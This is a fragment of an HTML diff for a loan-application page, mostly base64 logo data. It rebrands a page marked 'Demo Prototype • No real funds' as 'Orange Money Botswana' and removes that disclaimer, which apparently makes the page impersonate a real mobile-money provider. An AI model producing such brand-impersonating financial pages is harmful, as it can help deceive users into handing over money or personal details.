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" alt="MTN Logo" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
+        <div class="flex items-center justify-between pb-4 border-b border-zinc-800">
+          <div class="flex items-center gap-2.5">
+            <div class="w-9 h-9 bg-[#FF7900] rounded-lg flex items-end p-1 shadow-sm">
+              <span class="text-white font-extrabold text-[10px] leading-none">orange<span class="text-[6px] align-super">™</span></span>
+            </div>
+            <span class="font-black text-base text-white">Orange Money</span>
+          </div>
+          <button onclick="toggleMenu(false)" class="p-2 text-zinc-400 hover:text-white rounded-lg">
             <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
           </button>
         </div>
-        <nav class="mt-6 flex flex-col space-y-1">
-          <button onclick="goTo('home'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Home</button>
-          <button onclick="goTo('apply'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Apply Now</button>
-          <button onclick="showInfoModal('Check Application')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Check Application</button>
-          <button onclick="goTo('details'); toggleMenu(false);" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Loan Details</button>
-          <button onclick="showInfoModal('FAQs')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">FAQs</button>
-          <button onclick="showInfoModal('Contact Us')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Contact Us</button>
-          <button onclick="showInfoModal('Terms & Conditions')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Terms & Conditions</button>
-          <button onclick="showInfoModal('Privacy Policy')" class="text-left px-3 py-2.5 text-sm font-semibold  hover:bg-slate-100 text-slate-800">Privacy Policy</button>
+        <nav class="mt-6 space-y-1 text-sm font-semibold">
+          <button onclick="goTo('home'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">🏠 Home</button>
+          <button onclick="goTo('apply'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">⚡ Apply for Loan</button>
+          <button onclick="showInfoModal('Loan Terms'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">📄 Loan Terms</button>
+          <button onclick="showInfoModal('Support & Help'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">💬 Customer Care</button>
+          <button onclick="showInfoModal('Privacy Policy'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">🔒 Privacy Policy</button>
         </nav>
       </div>
-      <div class="text-xs text-slate-400 text-center">Demo Prototype • No real funds</div>
+      <div class="text-xs text-zinc-500 text-center font-medium">Orange Money Botswana • Mobile Financial Services</div>
     </div>
   </div>
 
   <!-- MAIN WRAPPER -->
-  <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">
+  <main class="w-full max-w-[760px] mx-auto px-4 py-4 flex-1">
 
-    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="data:image/png;base64,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